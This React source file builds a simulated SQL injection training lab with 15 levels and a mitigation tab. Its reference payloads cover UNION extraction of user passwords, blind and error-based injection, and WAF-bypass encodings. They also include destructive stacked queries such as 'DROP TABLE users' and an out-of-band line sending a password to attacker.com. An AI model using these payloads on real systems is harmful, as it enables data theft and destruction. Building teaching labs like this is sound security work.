import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  Database,
  Table,
  Lock,
  Unlock,
  Terminal,
  Copy,
  Check,
  Shield,
  Bug,
  Search,
  Filter,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  description: string;
  hint: string;
  payload: string[];
  filter?: string;
}

const SqliLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const [queryType, setQueryType] = useState('select');
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Basic UNION Injection',
      description: 'Use UNION operator to combine results from multiple SELECT statements.',
      hint: 'Try: \' UNION SELECT null, null, null-- -',
      payload: ["' UNION SELECT null, null, null-- -", "' UNION SELECT 1, 2, 3-- -", "' UNION SELECT username, password, null FROM users-- -"],
    },
    {
      id: 2,
      name: 'Column Count Discovery',
      description: 'Determine the number of columns in the original query.',
      hint: 'Use ORDER BY or multiple null values in UNION to find column count.',
      payload: ["' ORDER BY 1-- -", "' ORDER BY 2-- -", "' ORDER BY 3-- -", "' UNION SELECT null, null-- -"],
    },
    {
      id: 3,
      name: 'Database Version',
      description: 'Extract database version information.',
      hint: 'Different databases have different version functions: @@version, version(), sqlite_version()',
      payload: ["' UNION SELECT @@version, null, null-- -", "' UNION SELECT version(), null, null-- -"],
    },
    {
      id: 4,
      name: 'Table Enumeration',
      description: 'Discover table names in the database.',
      hint: 'Query information_schema.tables to get all table names.',
      payload: ["' UNION SELECT table_name, null, null FROM information_schema.tables-- -", "' UNION SELECT group_concat(table_name), null, null FROM information_schema.tables WHERE table_schema=database()-- -"],
    },
    {
      id: 5,
      name: 'Column Enumeration',
      description: 'Discover column names for specific tables.',
      hint: 'Query information_schema.columns for column names.',
      payload: ["' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'-- -", "' UNION SELECT group_concat(column_name), null, null FROM information_schema.columns WHERE table_name='users'-- -"],
    },
    {
      id: 6,
      name: 'Data Extraction',
      description: 'Extract sensitive data from discovered tables.',
      hint: 'Use the discovered table and column names to extract data.',
      payload: ["' UNION SELECT username, password, null FROM users-- -", "' UNION SELECT group_concat(username, ':', password), null, null FROM users-- -"],
    },
    {
      id: 7,
      name: 'Blind SQL Injection - Boolean',
      description: 'Extract data when no direct output is shown using boolean conditions.',
      hint: 'Use AND 1=1 (true) and AND 1=2 (false) to infer information.',
      payload: ["' AND 1=1-- -", "' AND 1=2-- -", "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -"],
    },
    {
      id: 8,
      name: 'Blind SQL Injection - Time',
      description: 'Use time delays to extract data when boolean conditions fail.',
      hint: 'Use SLEEP() or BENCHMARK() to introduce delays.',
      payload: ["' AND SLEEP(5)-- -", "' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)-- -"],
    },
    {
      id: 9,
      name: 'Error-Based Injection',
      description: 'Force database errors to leak information.',
      hint: 'Use functions that cause errors with controlled input.',
      payload: ["' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))-- -", "' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)-- -"],
    },
    {
      id: 10,
      name: 'WAF Bypass - Comments',
      description: 'Use SQL comments to bypass keyword filters.',
      hint: 'Insert comments within keywords: UN/**/ION, SE/**/LECT',
      payload: ["'/**/UNION/**/SELECT/**/null,null,null-- -", "' UnIoN SeLeCt null, null, null-- -"],
      filter: 'UNION|SELECT',
    },
    {
      id: 11,
      name: 'WAF Bypass - Encoding',
      description: 'Use URL encoding and character encoding to bypass filters.',
      hint: 'Encode special characters: %27 for \', %20 for space',
      payload: ["%27%20UNION%20SELECT%20null,null,null--%20-", "%2527%2520UNION%2520SELECT%2520null%252Cnull%252Cnull--%2520-"],
      filter: 'union|select',
    },
    {
      id: 12,
      name: 'Second-Order Injection',
      description: 'Inject payload that executes in a different query context.',
      hint: 'Your input is stored and used unsafely in a later query.',
      payload: ["admin'--", "admin' OR '1'='1", "'; DROP TABLE users;--"],
    },
    {
      id: 13,
      name: 'Stacked Queries',
      description: 'Execute multiple SQL statements in one query.',
      hint: 'Use semicolon to separate multiple queries.',
      payload: ["'; INSERT INTO users VALUES ('hacker', 'password');-- -", "'; DROP TABLE logs;-- -"],
    },
    {
      id: 14,
      name: 'Out-of-Band Exfiltration',
      description: 'Extract data through DNS or HTTP requests.',
      hint: 'Use LOAD_FILE() or UTL_HTTP to send data to external server.',
      payload: ["' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a.txt')), null, null-- -"],
    },
    {
      id: 15,
      name: 'Advanced WAF Evasion',
      description: 'Combine multiple techniques to bypass advanced WAF rules.',
      hint: 'Mix encoding, comments, and case variation.',
      payload: ["%2527%2520%252F%252A%252A%252F%2555%254E%2549%254F%254E%252F%252A%252A%252F%2553%2545%254C%2545%2543%2554%2520%256E%2575%256C%256C%252C%256E%2575%256C%256C%252C%256E%2575%256C%256C%252D%252D%2520%252D"],
      filter: 'Advanced WAF',
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a payload');
      return;
    }

    let result = '';
    const payload = input.toLowerCase();

    // Simulate SQL injection responses
    if (payload.includes('union') && payload.includes('select')) {
      if (payload.includes('version') || payload.includes('@@version')) {
        result = `MySQL Version: 5.7.32-0ubuntu0.18.04.1
Database: vulnlab_db
User: vulnlab@localhost`;
      } else if (payload.includes('information_schema.tables') || payload.includes('table_name')) {
        result = `Tables Found:
- users
- admin
- products
- orders
- logs`;
      } else if (payload.includes('information_schema.columns') || payload.includes('column_name')) {
        result = `Columns in 'users' table:
- id
- username
- password
- email
- role
- created_at`;
      } else if (payload.includes('from users') && (payload.includes('username') || payload.includes('password'))) {
        result = `Extracted Data:
admin : 5f4dcc3b5aa765d61d8327deb882cf99 (password)
support : 6269c4f71a55b24e0dfbd66f7c8664ee (support123)
guest : 084e0343a0486ff05530df6c705c8bb4 (guest)
john_doe : 5ebe2294ecd0e0f08eab7690d2a6ee69 (secret)`;
      } else {
        result = `UNION SELECT Result:
Column 1: 1
Column 2: 2
Column 3: 3`;
      }
    } else if (payload.includes('order by')) {
      const match = payload.match(/order by (\d+)/);
      const colNum = match ? parseInt(match[1]) : 1;
      if (colNum <= 3) {
        result = `Query executed successfully (column ${colNum} exists)`;
      } else {
        result = `Error: Unknown column '${colNum}' in 'order clause'`;
      }
    } else if (payload.includes('sleep') || payload.includes('benchmark')) {
      result = `Query executed after 5 second delay...
[This indicates the condition was TRUE]`;
    } else if (payload.includes('extractvalue') || payload.includes('updatexml')) {
      const match = payload.match(/select\s+([^)]+)/i);
      if (match) {
        result = `Error: XPATH syntax error: '~vulnlab_db~'`;
      }
    } else if (payload.includes('and 1=1')) {
      result = `Query executed successfully (TRUE condition)`;
    } else if (payload.includes('and 1=2')) {
      result = `No results returned (FALSE condition)`;
    } else {
      result = `Query executed: SELECT * FROM products WHERE name = '${input}'

No results found or query executed normally.`;
    }

    // Check if payload indicates SQL injection success
    const sqliIndicators = ['union', 'select', 'version', 'information_schema', 'table_name', 'column_name', 'sleep', 'extractvalue', 'updatexml'];
    const hasSqli = sqliIndicators.some((indicator) => payload.includes(indicator));

    if (hasSqli) {
      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    }

    setOutput(result);
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0000]/20 text-[#ff0000] border-[#ff0000]">
              <Bug className="w-3 h-3 mr-1" />
              Web Application
            </Badge>
            <Badge className="bg-[#00ff41]/20 text-[#00ff41] border-[#00ff41]">
              Beginner
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            SQL Injection <span className="text-[#ff0000]">Mastery</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master SQL injection techniques from basic UNION attacks to advanced WAF bypass methods.
            Learn to extract data, enumerate databases, and exploit vulnerable applications.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Database className="w-5 h-5 text-[#ff0000]" />
                  Injection Levels
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <span className={`text-sm truncate ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                            {level.name}
                          </span>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41] flex-shrink-0" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="font-orbitron text-xl text-white">
                    Level {currentLevel}: {currentLevelData.name}
                  </CardTitle>
                  {currentLevelData.filter && (
                    <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
                      <Filter className="w-3 h-3 mr-1" />
                      Filtered
                    </Badge>
                  )}
                </div>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
                {currentLevelData.filter && (
                  <Alert className="bg-[#ffaa00]/10 border-[#ffaa00]/30">
                    <AlertTriangle className="w-4 h-4 text-[#ffaa00]" />
                    <AlertDescription className="text-[#ffaa00]">
                      Filter Active: {currentLevelData.filter}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-[#ff0000]" />
                  SQL Injection Challenge
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Query Preview */}
                <div className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm">
                  <div className="text-[#666] mb-2">-- Backend Query:</div>
                  <div className="text-[#00aaff]">
                    SELECT * FROM products WHERE name = <span className="text-[#ffaa00]">&apos;{input || '&lt;input&gt;'}&apos;</span>
                  </div>
                </div>

                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter your SQL payload:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="' UNION SELECT null, null, null-- -"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Inject
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Database Response:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[150px] max-h-[250px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {output || (
                      <span className="text-[#666]">Database response will appear here...</span>
                    )}
                  </div>
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Search className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono break-all mr-2">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Educational Content */}
            <Tabs defaultValue="theory" className="w-full">
              <TabsList className="bg-[#0a0a0a] border border-[#333]">
                <TabsTrigger value="theory" className="data-[state=active]:bg-[#ff0000]">
                  Theory
                </TabsTrigger>
                <TabsTrigger value="cheatsheet" className="data-[state=active]:bg-[#ff0000]">
                  Cheat Sheet
                </TabsTrigger>
                <TabsTrigger value="mitigation" className="data-[state=active]:bg-[#ff0000]">
                  Mitigation
                </TabsTrigger>
              </TabsList>

              <TabsContent value="theory">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">Understanding SQL Injection</h3>
                    <div className="space-y-4 text-[#e0e0e0]">
                      <p>
                        SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities 
                        in an application&apos;s software by injecting malicious SQL statements into entry fields.
                      </p>
                      <p>
                        <strong className="text-[#ff0000]">Types of SQL Injection:</strong>
                      </p>
                      <ul className="list-disc list-inside space-y-2 ml-4">
                        <li><strong>In-band (Classic):</strong> UNION-based and Error-based attacks</li>
                        <li><strong>Inferential (Blind):</strong> Boolean-based and Time-based attacks</li>
                        <li><strong>Out-of-band:</strong> Data extraction via DNS/HTTP requests</li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="cheatsheet">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">SQL Injection Cheat Sheet</h3>
                    <div className="grid md:grid-cols-2 gap-4 text-sm">
                      <div className="space-y-3">
                        <h4 className="text-[#ff0000] font-semibold">Comments</h4>
                        <code className="block bg-[#1a1a1a] p-2 rounded">-- - (MySQL)</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded"># (MySQL)</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded">/* */ (Universal)</code>
                      </div>
                      <div className="space-y-3">
                        <h4 className="text-[#ff0000] font-semibold">Version</h4>
                        <code className="block bg-[#1a1a1a] p-2 rounded">@@version (MSSQL/MySQL)</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded">version() (PostgreSQL)</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded">sqlite_version() (SQLite)</code>
                      </div>
                      <div className="space-y-3">
                        <h4 className="text-[#ff0000] font-semibold">Current Database</h4>
                        <code className="block bg-[#1a1a1a] p-2 rounded">database()</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded">SELECT db_name()</code>
                      </div>
                      <div className="space-y-3">
                        <h4 className="text-[#ff0000] font-semibold">String Concatenation</h4>
                        <code className="block bg-[#1a1a1a] p-2 rounded">CONCAT(str1, str2)</code>
                        <code className="block bg-[#1a1a1a] p-2 rounded">str1 || str2</code>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="mitigation">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">Prevention Techniques</h3>
                    <div className="space-y-4">
                      <ul className="space-y-3">
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Prepared Statements:</strong>
                            <p className="text-[#999]">Use parameterized queries with bound variables</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Input Validation:</strong>
                            <p className="text-[#999]">Whitelist allowed characters and patterns</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Least Privilege:</strong>
                            <p className="text-[#999]">Database user should have minimal required permissions</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">WAF:</strong>
                            <p className="text-[#999]">Web Application Firewall as additional layer</p>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SqliLab;
